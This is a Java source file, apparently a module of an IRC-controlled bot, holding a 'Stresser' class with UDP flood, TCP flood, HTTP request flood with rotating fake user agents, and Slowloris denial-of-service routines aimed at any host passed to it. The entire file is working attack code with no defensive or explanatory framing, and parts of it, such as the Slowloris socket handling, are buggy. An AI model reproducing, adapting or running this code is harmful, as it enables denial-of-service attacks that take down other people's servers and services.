package com.elementiumdev.irc;

import java.io.DataInputStream;
import java.io.PrintWriter;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URL;
import java.util.Map;
import java.util.Map.Entry;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class Stresser {
	
	private final static String[] USER_AGENTS = {
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.68 Safari/534.24",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; FunWebProducts; GTB6.3; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET4.0C; .NET4.0E)",
			"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; GT-I9000 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.120",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Safari/531.2+",
			"Mozilla/4.0 (compatible;)",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
			"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB6.5; Orange 8.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; GTB6.6; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
			"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.8.131 Version/11.10" };
	
	private final static Map<String, ExecutorService> hosts = new ConcurrentHashMap<>();
	
	public static void stop(String taskId, String host) {
		if(host.isEmpty()) {
			for (Entry<String, ExecutorService> entry : hosts.entrySet()) {
				entry.getValue().shutdownNow();
				hosts.remove(entry.getKey());
			}
		} else {
			hosts.get(host).shutdownNow();
			hosts.remove(host);
		}
	}
	
	public static void stopAll() {
		for (Entry<String, ExecutorService> entry : hosts.entrySet()) {
			entry.getValue().shutdownNow();
			hosts.remove(entry.getKey());
		}
	}
	
	public static void udpStress(String source, String host, int port, int packetSize, int threads, final int delay, long time) throws Exception {
		if(host.isEmpty()) {
			return;
		}

		byte buffer[] = new byte[packetSize];
		final DatagramPacket packet = new DatagramPacket(buffer, buffer.length, InetAddress.getByName(host), port);
		final DatagramSocket socket = new DatagramSocket();
		
		ExecutorService executor = Executors.newFixedThreadPool(threads);
		hosts.put(host, executor);
		while((System.currentTimeMillis() < time) && hosts.containsKey(host)) {
			executor.submit(new Runnable() {

				@Override
				public void run() {
					try {
						socket.send(packet);
						
						if(delay > 0) {
							Thread.sleep(TimeUnit.SECONDS.toMillis(delay));
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
				
			});
		}		
		stop(source, host);
		socket.close();		
		
		Handler.sM("Starting: " + host + ":" + port);
	}
	
	public static void tcpStress(String source, String host, int port, int threads, final int delay, long time) throws Exception {
		if(host.isEmpty()) {
			return;
		}
		
		final Socket socket = new Socket(host, port);
        socket.setTcpNoDelay(true);
        
		ExecutorService executor = Executors.newFixedThreadPool(threads);
		hosts.put(host, executor);
		while((System.currentTimeMillis() < time) && hosts.containsKey(host)) {
			executor.submit(new Runnable() {

				@Override
				public void run() {
					Handler.sM("Starting: " + host + ":" + port);
					try {
						socket.sendUrgentData(255);
						
						if(delay > 0) {
							Thread.sleep(TimeUnit.SECONDS.toMillis(delay));
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
				
			});
		} 
		stop(source, host);
        socket.close();
	}
	
	public static void httpStress(String source, final String host, int threads, final int delay, long time) throws Exception {
		if(host.isEmpty()) {
			return;
		}
		
		HttpURLConnection.setFollowRedirects(false);
		final URL url = new URL(host);
		
		ExecutorService executor = Executors.newFixedThreadPool(threads);
		hosts.put(host, executor);
		while((System.currentTimeMillis() < time) && hosts.containsKey(host)) {
			executor.submit(new Runnable() {

				@Override
				public void run() {
					try {
						Handler.sM("Starting: " + host);
						HttpURLConnection uc = (HttpURLConnection) url.openConnection();
						uc.addRequestProperty("Accept", "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5");
						uc.addRequestProperty("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7");
						uc.addRequestProperty("Accept-Encoding", "gzip,deflate");
						uc.addRequestProperty("Accept-Language", "en-gb,en;q=0.5");
						uc.addRequestProperty("Connection", "keep-alive");
						uc.addRequestProperty("Host", url.getHost());
						uc.addRequestProperty("Keep-Alive", "300");
						uc.addRequestProperty("User-Agent", USER_AGENTS[(int) (Math.random() * USER_AGENTS.length)]);
						DataInputStream di = new DataInputStream(uc.getInputStream());

						int contentLength = uc.getContentLength();
						if (contentLength > 0) {
							byte[] buffer = new byte[uc.getContentLength()];
							di.readFully(buffer);
						}

						di.close();
						if(delay > 0) {
							Thread.sleep(TimeUnit.SECONDS.toMillis(delay));
						}
					} catch(Exception e) {
						e.printStackTrace();
					}
				}
				
			});
		} 	
		stop(source, host);
	}
	
	public static void slowlorisStresss(String source, final String host, final int port, final String method, int threads, final int delay, long time) throws Exception {
		if(host.isEmpty()) {
			return;
		}
		
		final Socket[] sockets = new Socket[threads];
		
		ExecutorService executor = Executors.newFixedThreadPool(threads);
		hosts.put(host, executor);
		while((System.currentTimeMillis() < time) && hosts.containsKey(host)) {
			executor.submit(new Runnable() {

				@Override
				public void run() {
					try {
						int id = (int) Thread.currentThread().getId();
						if(!sockets[id].isConnected()) {
							sockets[id] = new Socket(InetAddress.getByName(host), port);
							PrintWriter pw = new PrintWriter(sockets[id].getOutputStream());	                        
	                        String payload =  method + " / HTTP/1.1\r\n"
									+ "Host: " + host + "\r\n"
									+ "User-Agent: " +  USER_AGENTS[(int) (Math.random() * USER_AGENTS.length)] + "\r\n"
									+ "Content-Length: 42\r\n";
	                        pw.print(payload);
	                        pw.flush();
						} else {
							PrintWriter pw = new PrintWriter(sockets[id].getOutputStream());
							pw.print("X-a: b\r\n");
							pw.flush();
						}
						
						if(delay > 0) {
							Thread.sleep(TimeUnit.SECONDS.toMillis(delay));
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
				
			});
		} 	
		stop(source, host);
		for(Socket socket : sockets) {
			socket.close();
		}
	}
}
